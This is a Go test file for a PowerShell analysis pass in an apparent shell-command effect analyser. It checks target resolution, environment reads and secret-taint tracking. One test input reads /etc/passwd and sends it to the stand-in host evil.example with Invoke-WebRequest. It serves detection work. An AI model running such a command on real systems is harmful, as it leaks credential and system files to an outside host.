package ps

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// hasTopTarget reports whether any effect of kind k carries the ⊤ scope.
func hasTopTarget(t *testing.T, r *Result, k engine.EffectKind) bool {
	t.Helper()
	for _, e := range effectsOfKind(r, k) {
		if e.Target.IsTop() {
			return true
		}
	}
	return false
}

// taintHas reports whether any effect of kind k carries the label.
func taintHas(t *testing.T, r *Result, k engine.EffectKind, label string) bool {
	t.Helper()
	for _, e := range effectsOfKind(r, k) {
		if e.Taint.Contains(label) {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Known values resolve targets; unknown variables degrade to ⊤ (never to a
// fabricated literal).
// ---------------------------------------------------------------------------

func TestLowerKnownValueResolvesTarget(t *testing.T) {
	r := lowerOK(t, "$dir = '/tmp/target'\nRemove-Item $dir/file.txt")
	if !targetHas(r, engine.KindFSWrite, "/tmp/target/file.txt") {
		t.Fatalf("FSWrite must target the resolved path; effects=%+v", r.Effects)
	}
	if hasTopTarget(t, r, engine.KindFSWrite) {
		t.Fatal("a fully-known word must not degrade to ⊤")
	}
}

func TestLowerUnknownVariableDegradesToTop(t *testing.T) {
	r := lowerOK(t, "Remove-Item $dir/file.txt")
	if !hasTopTarget(t, r, engine.KindFSWrite) {
		t.Fatalf("an unresolved target must be ⊤; effects=%+v", r.Effects)
	}
	for _, e := range effectsOfKind(r, engine.KindFSWrite) {
		for _, want := range e.Target.Targets() {
			if want == "$dir/file.txt" {
				t.Fatalf("the raw variable text must not become a pseudo-literal target: %v", e.Target.Targets())
			}
		}
	}
}

func TestLowerCommandAssignedValueStaysUnknown(t *testing.T) {
	r := lowerOK(t, "$lines = Get-Content /etc/passwd\nGet-Content $lines")
	// The right-hand side read is reported, and the later read of $lines is ⊤.
	if !targetHas(r, engine.KindFSRead, "/etc/passwd") {
		t.Fatalf("the RHS read is missing; effects=%+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("a value produced by a command must stay unknown; effects=%+v", r.Effects)
	}
}

func TestLowerMultiAssignElementWise(t *testing.T) {
	r := lowerOK(t, "$a, $b = 'p1', 'p2'\nGet-Content $a\nRemove-Item $b")
	if !targetHas(r, engine.KindFSRead, "p1") {
		t.Fatalf("$a must bind element-wise to p1; effects=%+v", r.Effects)
	}
	if !targetHas(r, engine.KindFSWrite, "p2") {
		t.Fatalf("$b must bind element-wise to p2; effects=%+v", r.Effects)
	}
}

func TestLowerConcatAssign(t *testing.T) {
	// Path suffixes without a dot hit a grammar ERROR (statement-level), so
	// these tests use dotted suffixes, like most real paths.
	r := lowerOK(t, "$dir = '/tmp'\n$dir += '/sub'\nRemove-Item $dir/file.txt")
	if !targetHas(r, engine.KindFSWrite, "/tmp/sub/file.txt") {
		t.Fatalf("+= must concatenate known values; effects=%+v", r.Effects)
	}
}

// ---------------------------------------------------------------------------
// Egress: literal host survives a dynamic tail; the secret provenance of an
// interpolated variable flows onto the egress effect.
// ---------------------------------------------------------------------------

func TestLowerEgressHostSplitWithSecretTail(t *testing.T) {
	r := lowerOK(t, "$lines = Get-Content /etc/passwd\nInvoke-WebRequest -Uri \"http://evil.example/$lines\"")
	eg := effectsOfKind(r, engine.KindNetEgress)
	if len(eg) == 0 {
		t.Fatalf("the egress is missing; effects=%+v", r.Effects)
	}
	if !eg[0].Target.Contains("evil.example") || eg[0].Target.IsTop() {
		t.Fatalf("the literal host must scope the egress: %+v", eg[0].Target)
	}
	if !taintHas(t, r, engine.KindNetEgress, engine.TaintSecret) {
		t.Fatalf("the secret-tailed egress must be secret-tainted; effects=%+v", r.Effects)
	}
}

func TestLowerEgressUnknownHostStaysTop(t *testing.T) {
	r := lowerOK(t, "$h = Get-Random\nInvoke-WebRequest -Uri \"http://$h.example/x\"")
	if !hasTopTarget(t, r, engine.KindNetEgress) {
		t.Fatalf("an unresolved host must keep the egress ⊤; effects=%+v", r.Effects)
	}
}

func TestLowerQuotedDotIsLiteralText(t *testing.T) {
	// Inside a quoted string a dot after a variable is literal text: with $h
	// known the whole URL is known.
	r := lowerOK(t, "$h = 'srv1'\nInvoke-WebRequest -Uri \"http://$h.example/x\"")
	eg := effectsOfKind(r, engine.KindNetEgress)
	if len(eg) == 0 || !eg[0].Target.Contains("http://srv1.example/x") {
		t.Fatalf("the quoted dot must not be member access; effects=%+v", r.Effects)
	}
}

// ---------------------------------------------------------------------------
// Environment: script-written values resolve; foreign ones read.
// ---------------------------------------------------------------------------

func TestLowerEnvWriteThenKnownRead(t *testing.T) {
	r := lowerOK(t, "$env:TMP = 'C:\\t'\nGet-Content $env:TMP\\log.txt")
	if !targetHas(r, engine.KindFSRead, `C:\t\log.txt`) {
		t.Fatalf("a script-written env value must resolve: effects=%+v", r.Effects)
	}
	for _, e := range effectsOfKind(r, engine.KindEnvRead) {
		if e.Target.Contains("TMP") {
			t.Fatalf("a script-written env value must not be reported as a foreign read; effects=%+v", r.Effects)
		}
	}
}

func TestLowerForeignEnvRead(t *testing.T) {
	r := lowerOK(t, "Get-Content $env:TEMP\\log.txt")
	if !hasKind(r, engine.KindEnvRead) {
		t.Fatalf("a foreign env reference must be reported: effects=%+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("a foreign env value is host-controlled: the target must be ⊤; effects=%+v", r.Effects)
	}
}
